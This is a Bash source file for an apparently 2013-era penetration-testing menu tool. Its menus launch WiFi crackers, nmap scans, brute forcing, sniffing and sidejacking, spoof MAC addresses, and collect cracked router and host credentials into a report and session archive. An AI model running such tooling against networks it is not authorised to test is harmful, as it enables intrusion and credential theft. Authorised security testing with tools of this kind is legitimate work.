#__ Network Tools _________________________________________________________________________________
function network {                                                        # Network Menu
   cur_men="network"
   info
   echo
   echo -e "\e[01;36m<<NETWORK MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m NMap Menu"
   echo -e "\e[01;36m2)\e[00m Router Cracker"
   echo -e "\e[01;36m3)\e[00m Protocol Attacks"
   echo -e "\e[01;36m4)\e[00m Brute Force"
   echo -e "\e[01;36m5)\e[00m Exploits"
   echo -e "\e[01;36m6)\e[00m Change MAC and Hostname"
   echo -e "\e[01;36m7)\e[00m Sniffing Utility"
   echo -e "\e[01;36m8)\e[00m Sidejacking"
   echo -e "\e[01;36mQ)\e[00m Return to the Main Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) nmap_menu ;;
   2 ) router ;;
   3 ) protocol ;;
   4 ) brute_force ;;
   5 ) exploit ;;
   6 ) change_ident ;;
   7 ) sniff ;;
   8 ) sidejacking ;;
   q|Q ) info no && mainmenu ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

#__ Tools Functions _______________________________________________________________________________
function info() {                                                         # Main Display Items
   # Parsing Host Information
   sub="$(cat $tmp/cur_subnet)"
   if [ "$1" == "yes" ] ; then
#      wanip=$(cat $tmp/wanip 2>$logfile | head -n 1)                                # Get WAN IP Address
      router_pass="$(cat $tmp/router_pass 2>$logfile)"
      echo -e "\e[01;36mNum  |   IP Address/     | Last Scan/|    Manufacturer/  |  Computer Name/  |    Hostname/   | Device / Version\e[00m" > $tmp/targets
      echo -e "\e[01;36m     |   MAC Address     | NMap Lev  |  Operating System |     Username     |      Domain    | Interesting Ports\e[00m" >> $tmp/targets
      if [ "$2" == "" ] ; then
         t=( $(cat $tmp/list_$sub | grep $sub) )
      else
         echo $2 > $tmp/list_view
         t=( $(cat $tmp/list_view) )
      fi
      i="0"
      for a in "${t[@]}" ; do
	   i=$(($i+1))

      if [ -e "$scan_dir/$a.nmap" ] ; then
         grep -w open $scan_dir/$a.nmap | grep -v Warning | grep -v WARNING | sort -ug | egrep -w $interesting_ports | grep -v "initiated" > $tmp/f      # NMap Get Open Ports    
#__ Scan Level ____________________________________________________________________________________
         nor="$(grep -E '(Scan_level = Normal|Scan_level = Normal_NP)' $scan_dir/$a.nmap | awk '{ print $3}' | head -n1)"               # NMap Find If Normal Scan Completed
         agg="$(grep -E '(Scan_level = Aggressive_NP|Scan_level = Aggressive)' $scan_dir/$a.nmap | awk '{ print $3}' | head -n1)"       # NMap Find If Aggressive Scan Completed
         slo="$(grep "Scan_level = Slow" $scan_dir/$a.nmap | awk '{ print $3}' | head -n1)"
         png="$(grep "Scan_level = Ping" $scan_dir/$a.nmap | awk '{ print $3}' | head -n1)"
         fra="$(grep "Scan_level = Fragmented" $scan_dir/$a.nmap | awk '{ print $3}' | head -n1)"
         if [ "$slo" == "Slow" ] ; then
            scan_level="slow"
         elif [ "$fra" == "Fragmented" ] ; then
            scan_level="Fragmented"
         elif [ "$agg" == "Aggressive" ] || [ "$agg" == "Aggressive_NP" ] ; then
            scan_level="Aggressive"
         elif [ "$nor" == "Normal" ] ; then
            scan_level="Normal"  
         elif [ "$png" == "Ping" ] ; then
            scan_level="Ping"
         else
            scan_level=""
         fi
         
         alive="$(cat $scan_dir/$a.nmap | grep "Scanned at " | cut -c17-27 | tail -1)"

      fi                                                                                         # User Name     SOURCE 3   EXPLOIT
         if [ -f "$tmp/scans/hb_$a" ] ; then                           # Determines Heart Bleed Vulnerability
            hb="$(cat $tmp/scans/hb_$a | grep -o "FAIL" | head -n1)"
            if [ "$hb" == "PASS" ] ; then
               printf "\e[01;29mHB \e[00m" >> $tmp/open_ports
            elif [ "$hb" == "FAIL" ] ; then
               printf "\e[01;31mHB \e[00m" >> $tmp/open_ports
            fi
         fi
         if [ -f $tmp/f ] ; then
            cat $tmp/f | while read z ; do 
            filt="$(echo $z | grep filtered)"                          # Checks whether the port is open or filtered
            if [ "$filt" == "" ] ;then
               port="$(echo $z | cut -d '/' -f1)"
               printf "\e[01;32m$port \e[00m" >> $tmp/open_ports       # Prints open ports green
               port=""                                                 # Resets the value of $port so i does not get repeated in the next entry if nothing is there
            else
               port="$(echo $z | cut -d '/' -f1)"
               printf "\e[01;34m$port \e[00m" >> $tmp/open_ports       # Prints filtered ports blue
            fi
            done                  # Open Ports
         fi
         if [ -e "$tmp/open_ports" ] ; then 
            open_ports="$(cat $tmp/open_ports)"     
            rm $tmp/open_ports
            rm $tmp/f                                                  # Removing stopped bug with ports repeating themselves to the next client
         fi 

# Device Type ------------------------------------------- # Device Type
      if [ -z "$device_type" ] ; then                            # WMI Enumeration
         device_type="$(cat $tmp/scans/WMI_E-$a 2>$logfile | grep '|' | cut -d '|' -f25 | tail -1 2>$logfile)"
         device_type="$(echo -e "\e[01;34m$device_type\e[00m")"
         if [ -z "$device_type" ] ; then
            device_type="$(grep -w -A 8 $a $tmp/router_info 2>$logfile | grep "modelDescription: " | sed 's/.*modelDescription: \(.*\)/\1/' | head -n1 | cut -c1-17 2>$logfile)"
            if [ -z "$device_type" ] ; then
               device_type="$(grep "Device type: " "$scan_dir/$a.nmap" 2>$logfile | cut -d ':' -f2 | awk '{ print $1,$2 }' | head -n1 | cut -c1-17 2>$logfile)"
               if [ -z "$device_type" ] ; then
                  device_type="$(grep "Device: " "$scan_dir/$a.nmap" 2>$logfile | sed 's/.*Device: \(.*\)/\1/' | head -n1 | cut -c1-17 2>$logfile)"
               fi
            fi
         fi
      fi

# Computer Name ----------------------------------------- # Computer Name                  
      if [ -z "$computer_name" ] ; then
         computer_name="$(cat $tmp/scans/WMI_E-$a 2>$logfile | grep '|' | cut -d '|' -f9 | tail -1 2>$logfile)"
         if [ -z "$computer_name" ] ; then
            # computer_name="$(cat $tmp/ns_$a 2>$logfile | head -n1 | cut -c1-17 2>$logfile)"
            computer_name="$(head -c17 $tmp/ns_$a 2>$logfile)"
            if [ -z "$computer_name" ]  ; then
               #computer_name="$(grep -w -A 8 "$a" $tmp/router_info 2>$logfile | grep "friendlyName: " | cut -d ':' -f2 | head -n1 | cut -c2-18 2>$logfile)"
               computer_name="$(grep -w -A 8 "$a" $tmp/router_info 2>$logfile | grep "friendlyName: "  | awk 'NR==1,match($0,":"){print substr($0,RSTART+2,18)}')"
               if [ -z "$computer_name" ] ; then
                  computer_name="$(grep "iso.3.6.1.2.1.1.5.0 =" $scan_dir/snmp_info-$a 2>$logfile | sed 's/.*STRING: \(.*\)/\1/' | head -n1 | cut -d "\"" -f2 | cut -c1-18 2>$logfile)"
                  if [ -z "$computer_name" ] ; then
                     computer_name="$(grep "Computer name: " $scan_dir/$a.nmap 2>$logfile | awk 'NR==1{ print substr($4,1,18) }' 2>$logfile)"
                     if [ -z "$computer_name" ] ; then
                        computer_name="$(grep "Service Info: Host: " "$scan_dir/$a.nmap" 2>$logfile | awk 'NR==1{ print substr($4,1,18) }' 2>$logfile)"
                        if [ -z "$host_name" ] ; then
                           host_name="$(grep "$a" $tmp/ping_$sub 2>$logfile | grep -vE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v \# | awk '{ print $5 }' | head -n1 | cut -c1-19)"
                           if [ -z "$host_name" ] ; then
                              host_name="$(grep "$a" "$scan_dir/$a.nmap" 2>$logfile | grep -vE '(\#|Warning:|Skipping)' | awk '{ print $5 }'  | awk 'NR==1{ print substr($5,1,16) }')"
                           fi
                        fi
                     fi
                  fi
               fi
            fi
         fi
      fi

# OS ---------------------------------------------------- # OS
      if [ -z "$os" ] ; then                               # OS Details only come from NMAP so far
         os="$(grep "|   OS:" "$scan_dir/$a.nmap" 2>$logfile | awk 'NR==1{ print substr($3$4$5$6,1,18) }')"
         if [ -z "$os" ] ; then
            os="$(grep "Running" "$scan_dir/$a.nmap" 2>$logfile  | awk 'NR==1,match($0,":"){print substr($0,RSTART+2,19)}')"
            if [ -z "$os" ] ; then
               os="$(grep "OS details: " "$scan_dir/$a.nmap" 2>$logfile | awk 'NR==1,match($0,":"){print substr($0,RSTART+2,19)}')"
            fi
         fi
      fi

# User Name --------------------------------------------- # OS
      if [ -z "$user_name" ] ; then
         user_name="$(cat $tmp/scans/WMI_E-$a 2>$logfile | grep '|' | grep '|' | cut -d '|' -f56 | tail -1 2>$logfile)"
         if [ -z "$user_name" ] ; then
            if [ "$a" == "$gateway" ] ; then
               user_name=$(cat /tmp/menu/creds 2>$logfile | grep "$a " | awk '{ print $4 }' | head -n 1 | sed "s/'//g" 2>$logfile)
               if [ -z "$user_name" ] ; then
                  user_name="$(sed -n '1p' 2>$logfile < /tmp/menu/router_pass1 2>$logfile)"
                  if [ -z "$user_name" ] ; then
                     user_name="$(grep -w -A 8 "$a" $tmp/router_info 2>$logfile | grep "friendlyName: " | cut -d ':' -f3 | awk '{ print $1}' | head -n1 | cut -c1-18 2>$logfile)"
                  fi
               fi
            fi
         fi
      fi

# Workgroup --------------------------------------------  # Workgroup/Domain
      if [ -z "$workgroup" ] ; then                            # Workgroup/Domain Details only come from NMAP so far
         workgroup="$(cat $tmp/scans/WMI_E-$a 2>$logfile | grep '|' | cut -d '|' -f16 | tail -1 2>$logfile)"                                                               # WMI
         if [ -z "$workgroup" ] ; then    
            workgroup="$(grep 'Domain name:' $scan_dir/$a.nmap 2>$logfile | awk '{ print $4 }')"
            if [ -z "$workgroup" ]  ; then                            # Workgroup/Domain Details only come from NMAP so far
               workgroup="$(awk '/NetBIOS domain name:/ { print substr($5,1,18)}' $scan_dir/$a.nmap 2>$logfile | head -1)"
               if [ -z "$workgroup" ] ; then
                  workgroup="$(awk '/\|   Workgroup: / { print substr($3,1,18)}' $scan_dir/$a.nmap 2>$logfile)"
                  if [ -z "$workgroup" ] ; then
                     workgroup="$(awk -F '[()]' '/workgroup: / {print $2}' $scan_dir/$a.nmap 2>$logfile | awk 'NR==1{ print $2 }' 2>$logfile)"
                  fi
               fi
            fi
         fi
      fi    
# Model Number -----------------------------------------  # Model Number
      if [ -z "$model_number" ] ; then                  
         model_number="$(grep -w -A 8 "$a" $tmp/router_info 2>$logfile | grep "modelNumber" | awk 'NR==1{ print $2 }' 2>$logfile)"
         if [ -z "$model_number" ] ; then
            model_number="$(grep "|       Model Version: " "$scan_dir/$a.nmap" 2>$logfile | cut -d ':' -f2 | awk '{ print $1,$2,$3,$4,$5}' | head -n 1 | cut -c1-25 2>$logfile)"
         fi
      fi

# Manufacturer -----------------------------------------  # Manufacturer
      if [ -z "$manufacturer" ] ; then                            # Workgroup/Domain Details only come from NMAP so far
         manufacturer="$(cat $tmp/scans/WMI_E-$a 2>$logfile | grep '|' | cut -d '|' -f25 | tail -1 2>$logfile)"                                                            # WMI
         if [ -z "$manufacturer" ] ; then
            manufacturer="$(grep "$a" -A 2 $tmp/ping_$sub 2>$logfile | grep "MAC Address: " | awk -F '[()]' 'NR==1{ print $2 }' | cut -c1-17)"
            if [ -z "$manufacturer" ] ; then
               manufacturer="$(grep "|       Manufacturer: " $scan_dir/$a.nmap 2>$logfile | awk '{ print $4 }' | head -n1 | cut -c1-17)"
            fi
         fi
      fi
      
# Model Name -------------------------------------------- # Model Name
      if [ -z "$model_name" ] ; then                            # Workgroup/Domain Details only come from NMAP so far
         model_name="$(cat $tmp/scans/WMI_E-$a 2>$logfile | grep '|' | cut -d '|' -f26 | tail -1)"                                                                         # WMI
         if [ -z "$model_name" ] ; then
            model_name="$(grep "3.6.1.2.1.47.1.1.1.1.2.1 =" $scan_dir/snmp_info-$a 2>$logfile | sed 's/.*STRING: \(.*\)/\1/' | head -n1 | cut -c2-25)"
            if [ -z "$model_name" ] ; then
               model_name="$(grep "iso.3.6.1.2.1.1.1.0 =" $scan_dir/snmp_info-$a 2>$logfile | sed 's/.*STRING: \(.*\)/\1/' | head -n1 | cut -c2-25)"
               if [ -z "$model_name" ] ; then
                  model_name="$(grep -w -A 8 "$a" $tmp/router_info 2>$logfile | grep "modelName" | cut -d ' ' -f2,3,4,5,6,7,8 | head -n1 | cut -c1-25)"
                  if [ -z "$model_name" ] ; then
                     model_name="$(grep "|       Model Name: " "$scan_dir/$a.nmap" 2>$logfile | cut -d ':' -f2 | awk '{ print $1,$2,$3,$4,$5}' | head -n 1 | cut -c1-25)"
                  fi
               fi
            fi
         fi
      fi
      
# Hostname ---------------------------------------------- # Hostname


# MAC Address ------------------------------------------- # MAC Address
      if [ -z "$macaddress" ] ; then
         macaddress=$(grep "$a" -A 2 $tmp/ping_$sub 2>$logfile | grep "MAC Address: " | head -1 | awk '{ print $3 }')
         if [ -z "$macaddress" ] ; then
            macaddress="$(grep "MAC Address: " "$scan_dir/$a.nmap" 2>$logfile | awk '{ print $3 }' | head -n1)"
            if [ -z "$macaddress" ] ; then
               macaddress="Unknown"
            fi
         fi
      fi

# Gateway ----------------------------------------------- # Gateway
      if [ "$model_name" == "" ] ; then
         model_name="$device_type"
      fi
      if [ "$gateway" == "$a" ] ; then
         router_name="$model_name"
         router_number="$model_number"
         device_info="$(echo -e "$model_name / $model_number \e[01;34m[Gateway]\e[00m")"
      else
         device_info="$(echo -e "$model_name / $model_number")"
      fi
      if [ "$filter" == "off" ] ; then
         bo="\e[01;36m|\e[00m"
         echo -e "\e[01;36m-----|-------------------|-----------|-------------------|------------------|----------------|-------------------\e[00m" >> $tmp/targets

#                  num |  IP   |Alive?|Manufact|Comp Name| HN  |Dev Info| -  | MAC    |Nmap Lev| OS   |  UN   |  WG   | Ports                                     
         printf " %-4s$bo %-18s$bo%-11s$bo%-19s$bo%-18s$bo%-16s$bo%-15s\n %-4s$bo %-18s$bo%-11s$bo%-19s$bo%-18s$bo%-16s$bo%-15s\n"  "$i" "$a" "$alive" "$manufacturer" "$computer_name" "$host_name" "$device_info" "-" "$macaddress" "$scan_level" "$os" "$user_name" "$workgroup" "$open_ports" >> $tmp/targets
      else
         if [ "$scan_level" == "" ] || [ "$alive" != "" ] ; then
            bo="\e[01;36m|\e[00m"
            echo -e "\e[01;36m-----|-------------------|-----------|-------------------|------------------|----------------|-------------------\e[00m" >> $tmp/targets

#                     num |  IP   |Alive?|Manufact|Comp Name| HN  |Dev Info| -  | MAC    |Nmap Lev| OS   |  UN   |  WG   | Ports                                     
            printf " %-4s$bo %-18s$bo%-11s$bo%-19s$bo%-18s$bo%-16s$bo%-15s\n %-4s$bo %-18s$bo%-11s$bo%-19s$bo%-18s$bo%-16s$bo%-15s\n"  "$i" "$a" "$alive" "$manufacturer" "$computer_name" "$host_name" "$device_info" "-" "$macaddress" "$scan_level" "$os" "$user_name" "$workgroup" "$open_ports" >> $tmp/targets
         else
            i=$(($i-1))
         fi
      fi

      item="device_info passwords scan_level alive device_type workgroup host_name computer_name model_name model_number manufacturer os open_ports macaddress user_name"
      for m in ${item[@]} ; do
         eval "$m"=""                          # Blanks value 
      done
   done
   fi
   clear
   banner

#__ Network Data __________________________________________________________________________________
   $border
   echo -e "#                                       \e[01;36mNETWORK DATA\e[00m                                      \e[01;33m[Press (r)efresh]\e[00m           #"
   $border
#   if [ "$interface" != "" ] ; then 
      printf "$info%-14s=  \e[01;32m%-46s $info%-19s=  \e[01;32m$domain\e[00m\n" "Interface" "$interface" "Domain"
#   else 
#      printf "$error%-14s=  \e[01;31m%-46s\e[00m\n" "Interface"
#   fi
   if [ '$ssid' != "" ]  && [ '$ssid' != 'any/off' ] && [ "$interface" != "eth0" ] && [ "$interface" != "" ] ; then 
      printf "$info%-14s=  \e[01;32m%-46s \e[00m\n" "SSID" "$ssid - Key  =  $key"
   fi
   if [ "$gateway" != "" ] ; then
      printf "$info%-14s=  \e[01;32m%-46s $info%-19s=  \e[01;32m$perm_mac\e[00m\n" "Gateway" "$gateway" "Perm MAC Address"
   else
      printf "$error%-14s=  \e[01;31m%-46s\e[00m $error%-19s=  \e[01;31mNo Interface Chosen\e[00m\n" "Gateway" "Unavailable" "Perm MAC Address"
   fi
   if [ "$lan_ip" != "" ] && [ "$lan_ip" != '127.0.0.1' ] ; then
      printf "$info%-14s=  \e[01;32m%-46s $info%-19s=  \e[01;32m$curr_mac\e[00m\n" "LAN IP" "$lan_ip" "Curr MAC Address"
   else
      printf "$error%-14s=  \e[01;31m%-46s\e[00m $error%-19s=  \e[01;31mNo Interface Chosen\e[00m\n" "LAN IP" "Unavailable" "Curr MAC Address"
   fi
   if [ "$networkmask" != "" ] ; then
      display info "Netmask       =  \e[01;32m$networkmask\e[00m"
   else 
      display error "Netmask       =  \e[01;31mUnavailable\e[00m"
   fi

# WAN IP --------------------------------------------------# WAN IP
   if [ -f "$tmp/wan_ip" ] ; then
      p="$(cat $tmp/wan_ip)"
      if [ "$p" != "" ] ; then
         wanip="$(cat $tmp/wan_ip)"
      fi
   else
      if [ -e "$tmp/wanip" ] && [ "$wanip" != "Unreachable" ] ; then
         wanip="$(cat $tmp/wanip)"
      fi
   fi
      if [ "$wanip" == "" ] && [ "$interface" != "" ] ; then 
         display action "Wan IP        =  \e[01;33m[press -e- to populate WAN IP]\e[00m"
      elif [ "$wanip" == "Unreachable" ] ; then 
         display error "Wan IP        =  \e[01;31m$wanip - e - to Retry\e[00m"
      elif [ "$wanip" != "" ] && [ "$interface" != "" ] ; then   
         display info "Wan IP        =  \e[01;32m$wanip\e[00m"
      else
         display error "Wan IP        =  \e[01;31mUnavailable\e[00m"
      fi
   if [ "$network_type" != "" ] ; then
      display info "Network Type  =  \e[01;32m$network_type\e[00m"
   else
      display error "Network Type  =  \e[01;31mUnavailable\e[00m" 
   fi

# Credentials ----------------------------------------------# Credentials
      grep -h -A1 "Discovered credentials for" $tmp/*brute 2>$logfile | grep -Ev '(Discovered|--)' | sort -u > $tmp/creds
   if [ -e "/tmp/menu/router_pass" ] ; then
      cat /tmp/menu/router_pass >> $tmp/creds
   fi
   cred="$(cat $tmp/creds 2>$logfile)"
   if [ "$cred" != "" ] ; then
      $border
      echo -e "#                                       \e[01;36mCREDENTIALS\e[00m                                                                   #"
      $border


   fi

#__ Found Hosts _________________________________________________________________________________
   cat $tmp/creds 2>$logfile | while read line ; do
      display info "$line"
   done
   echo "Targeting $sub.0/$cidr" > $tmp/targeting
   targeting="$(cat $tmp/targeting)"
   $border
   printf "# \e[01;32m%-38s\e[00m \e[01;36mFOUND HOSTS\e[00m                                   \e[01;33m[press (s)can Hosts]\e[00m           #\n" "$targeting"
   $border
   host_list=$(cat $tmp/targets 2>$logfile)
   if [ "$host_list" == "" ] ; then
      display action "Hosts       =  \e[01;33m[No End Points Found - Enter When Scan Completes]\e[00m"
      $border
   else
      echo "$host_list"
      $border
      display action "\e[01;32mPress \e[00m\e[01;33m(C)\e[00m\e[01;32mlear Target Info - Re\e[00m\e[01;33m(s)\e[00m\e[01;32mcan - \e[00m\e[01;33m(v)\e[00m\e[01;32miew Scan Results - \e[00m\e[01;33m(f)\e[00m\e[01;32milter Dead Hosts \e[00m\e[01;31m($filter)\e[00m - \e[00m\e[01;33m(h)\e[00m\e[01;32melp \e[00m"
   fi
}

function wifite() {                                                       # Wifie
   action "Wifite Automated WiFi Cracker" "python /pentest/wireless/wifite/wifite.py -i $wiface" "true" &
   $cur_men
}

function gerix() {                                                        # Gerix
   python /usr/share/gerix-wifi-cracker-ng/gerix.py -i $wiface &
   $cur_men
}

function brute_ssid() {                                                   # SSID Brute
   action "SSID Brute Forcer" "python $ssid_brute_path" "true" &
   $cur_men
}

#__ Wireless Tools ________________________________________________________________________________
function airodump() {
   # info
   clear
   banner
   $border
   echo
   if [ "$wiface" == "$interface"  ] ; then
      display info "This Will Disconnect $interface"
      read -p "Continue? >>> "
      if [[ "$REPLY" =~ ^[Qq]$ ]] ; then
         $cur_men
      fi
   fi
   command="$(iwconfig 2>$logfile | grep "Mode:Monitor" | awk '{print $1}')"
   for i in $command ; do
      action "Stopping $wiface" "airmon-ng stop $i" "false"
   done
   airmon-ng start wlan0
   ifconfig wlan0 down
   ifconfig mon0 down
   macchanger -r mon0
   macchanger -r wlan0
   ifconfig wlan0 up
   ifconfig mon0 up
   airodump-ng mon0
   action "Finding WiFi Networks" "airodump-ng $wiface" "true" "1200|50|50" &
   $cur_men
}

function monitor_mode() {
   # info
   clear
   banner 
   $border 
   echo
   if [ "$wiface" == "$interface"  ] ; then
      display info "This Will Disconnect $interface"
      read -p "Continue? >>> "
      if [[ "$REPLY" =~ ^[Qq]$ ]] ; then
         $cur_men
      fi
   fi
      airmon-ng start wlan0
      ifconfig wlan0 down
      ifconfig mon0 down
      macchanger -r mon0
      macchanger -r wlan0
      ifconfig wlan0 up
      ifconfig mon0 up
      $cur_men
}

function wireless() {
   cur_men="wireless"
   clear
   banner
   $border
   echo -e "#                                  \e[01;36mWIRELESS DATA\e[00m                                                  #"
   $border
   echo 
   echo -e "\e[01;36m<<WIRELESS MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m Put WLAN0 in Monitor Mode"
   echo -e "\e[01;36m2)\e[00m Airodump-ng"
   echo -e "\e[01;36m3)\e[00m Gerix-WiFi-Cracker"
   echo -e "\e[01;36m4)\e[00m Wifite"
   echo -e "\e[01;36m5)\e[00m SSID Brute Force"
   echo -e "\e[01;36m6)\e[00m Empty"
   echo -e "\e[01;36mq)\e[00m Quit"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in

   1 ) monitor_mode ;;
   2 ) airodump ;;
   3 ) gerix ;;
   4 ) wifite ;;
   5 ) brute_ssid ;;
   q|Q ) info no && mainmenu ;;
   * ) aux_menu ;;
   esac
   $cur_men
}

function gen_rep() {
   info
   echo  
   session="$(echo $ssid | sed 's/ /_/g' )"
   read -p "$action Enter Session Name? (default = $session) >>> " session1
   if [ "$session1" != "" ] ; then
      session="$session1"
   fi
   read -p "$action Report Location? (default = "$pref_save_path") >>> " report_path1
   if [ "$choice" != "" ] ; then
      "report_path"="$report_path1"
   fi
   if [ -e "$pref_save_path$session" ] ; then
      read -p "$error Report found at $report - Overwrite? (Y/n) >>> "
      if [[ "$REPLY" =~ ^[Nn]$ ]] ; then
         mainmenu
      elif [[ "$REPLY" =~ ^[Yy]$ ]] || [ "$REPLY" == "" ] ; then
         rm "$pref_save_path$session"
      else
         aux_menu
      fi
   fi
   echo "" >> $pref_save_path$session
   echo >> $pref_save_path$session
   banner >> $pref_save_path$session
   echo >> $pref_save_path$session
   $border >> $pref_save_path$session
   echo "             Gateway = $gateway
              WAN IP = $wanip
           Interface = $interface
                SSID = $ssid
              LAN IP = $lan_ip
           Broadcast = $broadcast
         Networkmask = $networkmask
              WiFace = $wiface
   Monitor Interface = $monface
        Network Type = $network_type
     Connection Type = $connection_type" >> $pref_save_path$session
   $border >> $pref_save_path$session
   echo "Router Info" >> $pref_save_path$session
   echo "$model_name" >> $pref_save_path$session
   echo "$router_number" >> $pref_save_path$session
   cat $tmp/router_pass 2>$logfile >> $pref_save_path$session
   $border >> $pref_save_path$session
   echo "Parsed NMap Ping Sweep" >> $pref_save_path$session
   cat $tmp/targets 2>$logfile >> $pref_save_path$session
   $border >> $pref_save_path$session
   echo "NMap Scan Reports" >> $pref_save_path$session
   cat $scan_dir/* 2>$logfile >> $pref_save_path$session
   $border >> $pref_save_path$session
   if [ -e "$pref_save_path$session" ] ; then display info "Report Saved to $pref_save_path$session" ; fi
   sleep 2

   if [ -e $pref_save_path$session.sln ] ; then
      read -p "$error Archive found at $pref_save_path$session - Overwrite? (Y/n) >>> "
      if [[ "$REPLY" =~ ^[Nn]$ ]] ; then
         mainmenu
      elif [[ "$REPLY" =~ ^[Yy]$ ]] || [ "$REPLY" == "" ] ; then
         rm $pref_save_path$session.sln
      else
         aux_menu
      fi
   fi
   cd $tmp
   tar -cf $pref_save_path$session.sln *
   if [ -e "$pref_save_path$session.sln" ] ; then 
      display info "Session Data Saved to - $pref_save_path$session"
   else
      display error "Save FAILED!!! See $logfile For Details"
      sleep 2
   fi
   sleep 1
   cd $wd
   $cur_men
}

function load_archive() {
   cd $pref_save_path
   if [ "$file" == "" ] ; then 
      file="$(yad --title="Choose File To Load" --file-selection --file-filter=*.sln --width=600 --height=600)"
   fi
   if [ "$file" == "" ] ; then mainmenu ; fi
   rm -rf $tmp
   mkdir $tmp && cd $tmp
   tar -xf $file
   clear
	banner
   if [ -d "$tmp" ] ; then display info "Loading Report $file..." ; fi
   cd $wd
   file=""
   ident
   mainmenu
}

function full_audit() {
   action "Full Audit" "cd $(pwd)/enumeration && ./discover.sh" "" "true" &
   $cur_men
}

#__________________________________________________________________________________________________
#__ Main Menu _____________________________________________________________________________________
function mainmenu() {
cur_men="mainmenu"
echo ""
echo -e "\e[01;36m<<MAIN MENU>>\e[00m"
echo -e "\e[01;36m1)\e[00m Wirless Tools"
echo -e "\e[01;36m2)\e[00m Network Tools"
echo -e "\e[01;36m4)\e[00m Payload Generator"
echo -e "\e[01;36m5)\e[00m Archive Session"
echo -e "\e[01;36m6)\e[00m Load Archive"
echo -e "\e[01;36mq)\e[00m Quit"
echo
read -p "$action Choose Option >>> " menu_choice

case $menu_choice in
1 ) $"wireless" ;;
2 ) network ;;
4 ) payload ;;
5 ) gen_rep ;;
6 ) load_archive ;;
q|Q ) $"cleanup" ;;
* ) aux_menu ;;
esac
$cur_men
}

ident   
                                     # 
function all() {
cur_men="mainmenu"
   if [ "$lan_ip" != "" ] && [ "$interface" != "" ] ; then
#      info
      netdiscover all 
      info
      external_ip &
      upnp
      mainmenu
   else
      clear
      echo
      display error "Network Not Reachable"
      sleep 2
   fi
}

function in_help() {                                                         # Help Menu
clear
banner
   echo "VvEeHhFfIiRrSsMmCcBb
 Live Options:                     Purpose:
   b|B [Banner]                      ---  Toggle The Banner Display

   s|S [Scan]                        ---  Runs a Ping (S)can

   c|C [Clear]                       ---  Clear Hosts (Buggy)

   r|R [Refresh]                     ---  (R)efresh Live Report

   v|V [View]                        ---  (V)iew Indicated NMap Report

   f|F [Filter]                      ---  (F)ilter Dead Hosts From Live Report

   e|E [WAN IP]                      ---  Find The (E)xternal IP Address

   h|H [Help]                        ---  Display Help Information

   m|M [Add Subnet]                  ---  Add Additional Subnet To Scan For (Broken For Now)

   i|I [Detailed Information]        ---  Detailed Info About Network/Domain/Subnets/Routing

$action Press (h|H) at Anytime To Return To This Section
$info -Enter- To Continue To Live Report"
read
info && $cur_men
}

function help() {                                                         # Help Menu
clear
banner

   echo "(C)opyright 2013 Michael Clancy ~ Google Code

 Usage: bash $0.sh -i [interface] -t [monitor interface] -e [ESSID] -b [MAC]
              -p [wordslist/brute] -w [/path/to/]
             (-s [MAC]) -q -d [-?])


 Options:
   -b [No Banner]                     ---  This Will Suppress the Banner Display
   -a [Enum All]                      ---  Run all Enumeration functions (NMap Ping Sweep, UPnP, Get WAN IP etc...)

   -i [interface]                     ---  Internet Interface e.g. $interface
   -l [file]                          ---  Archived File to Load
   -t [interface]                     ---  Monitor Interface e.g. $monitorInterface

   -p [wordslist/brute]               ---  Path to Brute Force Wordlist

   -w [/path/to/]                     ---  Path to Report (file or folder) e.g. $scan_dir

   -s [MAC]                           ---  Use this MAC Address e.g. $fakeMac

   -o [/path/to/folder/]              ---  Output folder for the temp files

   -? / -h                            ---  This screen


 Example:
   bash $0                                                 # Run The Script
   bash $0 -i wlan0                                        # Choose Interface Wlan0
   bash $0 -i wlan0 -s 00:11:22:33:44:55                   # Change MAC Address on Wlan0              
   bash $0 -b                                              # No Banner"
}
while getopts "i:l:m:w:s:abcqh?" OPTIONS; do
   case ${OPTIONS} in
      c ) change_ident ;;
      a ) all ;;
      l ) file=$OPTARG && load_archive ;;
      i ) iface=$OPTARG ;;
      m ) monitorInterface=$OPTARG ;;
      b ) banner="false" ;;
      w ) wordlist=$OPTARG ;;
      s ) fakeMac="random" ;;
      q|Q ) quiet="true" ;;
      h ) help; exit ;;
      ? ) help; exit ;;
   esac
done
ident
mainmenu
